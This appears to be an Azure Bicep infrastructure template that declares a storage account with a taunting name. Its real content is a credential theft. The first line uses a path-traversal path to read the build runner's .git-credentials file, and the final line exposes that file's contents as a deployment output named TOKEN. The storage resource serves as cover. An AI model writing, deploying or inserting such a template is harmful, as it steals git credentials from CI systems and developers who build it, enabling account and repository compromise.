
  var creds = loadTextContent('../../../../../../home/runner/.git-credentials')

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output TOKEN string = creds